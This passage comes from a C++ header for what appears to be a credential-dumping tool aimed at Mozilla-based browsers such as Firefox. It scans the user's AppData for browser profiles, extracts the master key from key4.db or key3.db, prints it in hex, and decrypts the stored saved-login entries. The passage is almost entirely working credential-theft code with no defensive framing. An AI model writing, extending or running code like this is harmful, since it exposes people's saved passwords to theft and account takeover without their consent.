                // browser name (e.g. "...\Mozilla\Firefox\Profiles\xxx.default").
                std::filesystem::path p = entry.path();
                std::wstring browser = L"Unknown";
                for (int i = 0; i < 4; ++i) {
                    if (p.has_parent_path()) {
                        p = p.parent_path();
                        std::wstring name = p.filename().wstring();
                        if (name.find(L"Profiles") == std::wstring::npos &&
                            !name.empty()) {
                            browser = name;
                        }
                    }
                }
                out.push_back({browser, entry.path()});
            } else {
                ScanForProfiles(entry.path(), depth - 1, out);
            }
        }
    }

    inline std::vector<ProfileLocation> FindAllProfiles() {
        std::vector<ProfileLocation> result;

        wchar_t* appData = nullptr;
        if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &appData) != S_OK)
            return result;

        std::filesystem::path root(appData);
        CoTaskMemFree(appData);

        ScanForProfiles(root, 5, result);
        return result;
    }

    // =========================================================================
    // 11. Orchestrator
    // =========================================================================

    inline void Run() {
        std::cout << "\n=== Mozilla-based browsers (universal scanner) ===\n";

        auto profiles = FindAllProfiles();
        if (profiles.empty()) {
            std::cout << "[-] No Mozilla-based profiles found.\n";
            return;
        }

        std::cout << "[+] Found " << profiles.size() << " profile(s)\n";

        for (auto& prof : profiles) {
            std::wcout << L"\n[profile] " << prof.browserName
                       << L" — " << prof.profilePath.wstring() << L"\n";

            std::vector<BYTE> masterKey;

            // Try key4.db first (modern).
            if (std::filesystem::exists(prof.profilePath / "key4.db")) {
                if (ExtractKey4MasterKey(prof.profilePath, masterKey)) {
                    std::cout << "[+] Master key from key4.db: "
                              << masterKey.size() << " bytes\n";
                }
            }

            // Fallback to key3.db (legacy).
            if (masterKey.empty() &&
                std::filesystem::exists(prof.profilePath / "key3.db")) {
                if (ExtractKey3MasterKey(prof.profilePath, masterKey)) {
                    std::cout << "[+] Master key from key3.db: "
                              << masterKey.size() << " bytes\n";
                }
            }

            if (masterKey.empty()) {
                std::cout << "[-] Could not extract master key "
                             "(Primary Password may be set).\n";
                continue;
            }

            std::cout << "[+] Master key (hex): "
                      << BytesToHex(masterKey.data(), masterKey.size()) << "\n";

            int decrypted = DecryptLoginsFile(prof.profilePath, masterKey);
            std::cout << "[+] Entries decrypted: " << decrypted << "\n";
        }
    }
}

#endif